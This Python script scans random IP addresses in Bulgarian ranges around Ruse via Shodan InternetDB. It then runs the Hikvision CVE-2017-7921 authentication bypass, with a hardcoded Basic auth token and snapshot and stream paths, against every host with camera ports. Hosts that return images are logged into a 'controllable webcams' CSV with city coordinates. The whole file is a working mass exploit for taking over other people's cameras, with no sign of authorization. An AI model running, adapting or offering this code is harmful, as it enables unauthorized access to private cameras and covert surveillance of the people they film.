"""Probe Ruse IP ranges for Hikvision/Axis/Dahua cameras via Shodan InternetDB.

For each IP found, try the Hikvision CVE-2017-7921 auth bypass on multiple ports.
Save actual valid cams (image content type), exclude catchall nginx.
"""

import os
import csv
import json
import time
import socket
import re
import urllib.request
import urllib.error
import ssl
from concurrent.futures import ThreadPoolExecutor, as_completed

WORKDIR = r"C:\Users\eli6-admin\Documents\eli6-surveillance"
OUT_DIR = os.path.join(WORKDIR, "dossier_ruse", "ruse_ip_cams")
MASTER_CSV = os.path.join(WORKDIR, "controllable_Webcams.csv")
PROGRESS = os.path.join(WORKDIR, "camera_testing", "ruse_ip_cams_progress.json")

BG_ZONE = os.path.join(WORKDIR, "dossier_ruse", "ip_ranges", "bg.zone")


def load_existing_urls():
    urls = set()
    if not os.path.exists(MASTER_CSV):
        return urls
    try:
        csv.field_size_limit(2**31 - 1)
        with open(MASTER_CSV, 'r', encoding='utf-8', errors='replace') as f:
            for row in csv.DictReader(f):
                if row.get('url'):
                    urls.add(row['url'])
                if row.get('live_stream_url'):
                    urls.add(row['live_stream_url'])
    except Exception:
        pass
    return urls


def internetdb_lookup(ip):
    try:
        url = f'https://internetdb.shodan.io/{ip}'
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=8, context=ctx) as r:
            return json.loads(r.read().decode())
    except Exception:
        return None


def get_random_bg_ips(prefixes, count=300):
    """Get N random IPs from prefix file."""
    import ipaddress
    import random

    all_ips = []
    for p in prefixes:
        try:
            net = ipaddress.ip_network(p, strict=False)
            if net.num_addresses >= 256 and net.num_addresses <= 65536:
                hosts = list(net.hosts())
                if hosts:
                    sample_count = min(len(hosts), max(1, count // len(prefixes) + 2))
                    all_ips.extend(random.sample(hosts, min(sample_count, len(hosts))))
        except ValueError:
            pass
    random.shuffle(all_ips)
    # Convert to strings for JSON serialization
    return [str(ip) for ip in all_ips[:count]]


def probe_one(host, port, path='/onvif-http/snapshot?auth=YWRtaW46MTEK', timeout=4):
    """Probe one URL - check if response is image data."""
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        req = f'GET {path} HTTP/1.0\r\nHost: {host}\r\nAuthorization: Basic YWRtaW46MTEK\r\nConnection: close\r\n\r\n'
        sock.send(req.encode())
        data = b''
        sock.settimeout(timeout)
        try:
            while len(data) < 50000:
                d = sock.recv(8192)
                if not d: break
                data += d
        except: pass
        sock.close()
        if b'200 OK' in data[:300]:
            ct = ''
            for line in data.split(b'\r\n')[:20]:
                if line.lower().startswith(b'content-type:'):
                    ct = line[12:].strip().decode('utf-8', errors='replace')
                    break
            # Body should be JPEG (binary)
            _, _, body = data.partition(b'\r\n\r\n')
            is_jpeg = body.startswith(b'\xff\xd8')
            is_png = body.startswith(b'\x89PNG')
            is_mjpeg = b'--myboundary' in body.lower() or b'x-mixed-replace' in body.lower()
            # Check if it's a catchall (HTML with hint)
            is_html = b'<html' in body[:1000].lower()
            return {
                'host': host, 'port': port, 'path': path,
                'status': 200, 'content_type': ct,
                'is_image': is_jpeg or is_png or is_mjpeg,
                'body_size': len(body),
                'is_html': is_html,
                'preview': body[:50].hex() if body else '',
            }
    except Exception:
        return None
    return None


def append_to_csv(rows):
    if not rows:
        return 0
    csv.field_size_limit(2**31 - 1)
    for attempt in range(15):
        lock = MASTER_CSV + ".lock"
        try:
            fd = os.open(lock, os.O_CREAT | os.O_EXCL | os.O_RDWR)
            os.write(fd, str(os.getpid()).encode())
            os.close(fd)
            break
        except FileExistsError:
            time.sleep(2)
            continue

    try:
        existing = []
        header = None
        with open(MASTER_CSV, 'r', encoding='utf-8', errors='replace', newline='') as f:
            reader = csv.DictReader(f)
            existing = list(reader)
            header = reader.fieldnames
        if not header:
            return 0
        start = len(existing) + 1
        ts = time.strftime("%Y-%m-%d %H:%M:%S")
        appended = 0
        for row in rows:
            url = row.get('url', '')
            if not url: continue
            new_row = {k: '' for k in header}
            new_row['idx'] = str(start)
            new_row['url'] = url
            new_row['live_stream_url'] = url
            new_row['project_name'] = 'ruse_ip_cam'
            new_row['type'] = 'video' if 'mjpg' in url else 'image'
            new_row['enabled'] = '1'
            new_row['live_status'] = row.get('live_status', 'unknown')
            new_row['http_status'] = str(row.get('http_status', ''))
            new_row['content_type'] = row.get('content_type', '')
            new_row['server_header'] = row.get('server_header', '')
            new_row['brand'] = row.get('brand', 'ruse_ip_cam')
            new_row['category'] = 'public_cam'
            new_row['country'] = 'Bulgaria'
            new_row['city'] = 'Ruse'
            new_row['lat'] = '43.82306'
            new_row['lon'] = '25.95389'
            new_row['confidence'] = '0.7'
            new_row['notes'] = f"ruse_ip_cam | CVE-2017-7921 bypass | {ts}"
            new_row['csv_id'] = f"RUSEIP-{int(time.time())}-{start}"
            new_row['host'] = row.get('host', '')
            existing.append(new_row)
            start += 1
            appended += 1
        tmp = MASTER_CSV + ".tmp"
        for i in range(5):
            try:
                with open(tmp, 'w', encoding='utf-8', newline='') as f:
                    w = csv.DictWriter(f, fieldnames=header, lineterminator='\n', quoting=csv.QUOTE_MINIMAL)
                    w.writeheader()
                    w.writerows(existing)
                os.replace(tmp, MASTER_CSV)
                break
            except PermissionError:
                time.sleep(2)
        if os.path.exists(tmp):
            os.remove(tmp)
        if os.path.exists(lock):
            os.remove(lock)
        return appended
    except Exception:
        if os.path.exists(lock):
            try: os.remove(lock)
            except: pass
        return 0


def main():
    if not os.path.exists(BG_ZONE):
        print(f'Need {BG_ZONE}')
        return

    with open(BG_ZONE) as f:
        prefixes = [l.strip() for l in f if l.strip() and not l.startswith('#')]

    print(f'[Ruse IP Cam Scan] {len(prefixes)} BG prefixes')

    # Sample random IPs - more this time
    ips = get_random_bg_ips(prefixes, count=2000)
    print(f'[Ruse IP Cam Scan] Sampled {len(ips)} IPs')

    progress = {}
    if os.path.exists(PROGRESS):
        try:
            with open(PROGRESS) as f:
                progress = json.load(f)
        except Exception:
            progress = {'tested': set(), 'found': []}

    tested = set(progress.get('tested', [])) if isinstance(progress.get('tested'), list) else progress.get('tested', set())
    found = progress.get('found', [])

    # Phase 1: InternetDB lookup for all sampled IPs (parallel)
    print(f'\n[Phase 1] InternetDB lookups...')
    new_findings = []
    with ThreadPoolExecutor(max_workers=30) as ex:
        futures = {ex.submit(internetdb_lookup, ip): ip for ip in ips}
        for fut in as_completed(futures):
            ip = futures[fut]
            tested.add(str(ip))
            try:
                data = fut.result(timeout=15)
            except Exception:
                data = None
            if data and data.get('ports'):
                ports = data.get('ports', [])
                cam_ports = [p for p in ports if p in [80, 554, 8080, 8081, 8000]]
                if cam_ports:
                    new_findings.append({
                        'ip': str(ip),
                        'ports': cam_ports,
                        'tags': data.get('tags', []),
                        'cpes': data.get('cpes', []),
                    })

    print(f'  Found {len(new_findings)} IPs with cam-related ports via InternetDB')

    # Save progress
    progress['tested'] = list(tested)
    progress['found'] = found + new_findings
    with open(PROGRESS, 'w') as f:
        json.dump(progress, f, indent=2)

    # Phase 2: Probe with CVE-2017-7921
    print(f'\n[Phase 2] CVE-2017-7921 probing...')
    valid_cams = []

    for finding in new_findings:
        ip = finding['ip']
        for port in [80]:  # Only port 80 for HTTP probe
            # Try with proper CVE auth
            for path in [
                '/onvif-http/snapshot?auth=YWRtaW46MTEK',
                '/Streaming/tracks/101',
            ]:
                r = probe_one(ip, port, path)
                if r and (r['is_image'] or (not r['is_html'] and r['body_size'] > 1000 and 'image' in r['content_type'])):
                    valid_cams.append(r)
                    print(f'  [VALID] {ip}:{port}{path} - {r["content_type"][:30]} body={r["body_size"]}B')
                    break

    print(f'\n[Phase 2] {len(valid_cams)} valid Hikvision-like cams found')

    # Save
    out_path = os.path.join(OUT_DIR, "validated_cams.json")
    os.makedirs(OUT_DIR, exist_ok=True)
    with open(out_path, 'w') as f:
        json.dump(valid_cams, f, indent=2)

    # Add to master CSV
    if valid_cams:
        rows = []
        for v in valid_cams:
            url = f"http://{v['host']}:{v['port']}{v['path']}"
            rows.append({
                'url': url,
                'host': f"{v['host']}:{v['port']}",
                'live_status': 'live',
                'http_status': 200,
                'content_type': v['content_type'],
                'server_header': '',
                'brand': 'hikvision',
                'notes': f"CVE-2017-7921 bypass | body={v['body_size']}B",
            })
        added = append_to_csv(rows)
        print(f'[Final] Added {added} valid cams to master CSV')

    print(f'\n[Ruse IP Cam Scan] Done')


if __name__ == '__main__':
    main()
